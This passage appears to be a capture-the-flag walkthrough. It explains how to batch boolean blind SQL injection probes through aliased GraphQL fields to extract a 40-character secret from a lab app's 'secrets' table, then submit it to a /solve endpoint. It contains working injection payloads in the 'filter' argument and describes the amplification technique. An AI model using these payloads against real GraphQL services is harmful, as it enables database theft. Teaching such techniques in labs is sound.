Batch the probes. A single GraphQL document can contain many **aliased** copies of
the same field, and each alias runs the resolver independently and returns its own
result under its own key. So one HTTP request can ask hundreds of yes/no questions
at once:

```graphql
query {
  p1c0: searchReports(
    filter: "' AND (SELECT substr(batch_flag,1,1) FROM secrets LIMIT 1)='0' -- "
  ) {
    id
  }
  p1c1: searchReports(
    filter: "' AND (SELECT substr(batch_flag,1,1) FROM secrets LIMIT 1)='1' -- "
  ) {
    id
  }
  # ... every hex char for position 1 ...
  p2c0: searchReports(
    filter: "' AND (SELECT substr(batch_flag,2,1) FROM secrets LIMIT 1)='0' -- "
  ) {
    id
  }
  # ... and so on for positions 2, 3, ... 40
}
```

In the JSON response, look at `data`: whichever alias returned a **non-empty list**
tells you that `(position, character)` pair is correct. Walk positions 1..40,
collect the winning character for each, and you have the full 40-char
`batch_flag`. 40 × 16 = 640 probes; at ~128 aliases per request that is about five
round-trips — check `metrics` afterwards to see the amplification.

Then hand the secret in:

```
POST /solve
{"flag": "<the 40 hex characters>"}
```

On an exact match, `/solve` returns `{"flag": "FLAG{...}"}`. `/solve` uses a bound
query — don't try to inject there; `searchReports` is the only door.

`tests/exploit.py` implements this end to end (stdlib only) if you want to check
your work.
